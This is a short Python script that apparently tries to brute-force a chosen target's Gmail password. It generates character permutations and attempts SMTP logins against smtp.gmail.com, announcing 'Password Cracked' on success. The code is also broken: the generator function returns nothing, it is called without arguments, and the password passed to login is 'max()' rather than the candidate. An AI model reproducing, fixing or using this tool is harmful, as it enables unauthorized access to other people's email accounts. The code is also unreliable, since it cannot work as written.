import itertools
import smtplib
import requests
import sys

url="https://www.google.com"
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = vall = input("Enter Target's Gmail Address: ")
def print_perms(chars, minlen, maxlen):
    for n in range(minlen, maxlen+1):
        for perm in itertools.product(chars, repeat=n):
            print(''.join(perm))

print_perms("@abcdefghijklmnopqrstuvwxyz12345678910   ", 10, 15,)

for symbols in print_perms():
    try:
        smtpserver.login(user,password = max())

        print, "[+] Password Cracked: %s" % symbols
        sys.exit()

        break;
    except smtplib.SMTPAuthenticationError:
        print( "[!] password Inccorect: %s" % symbols)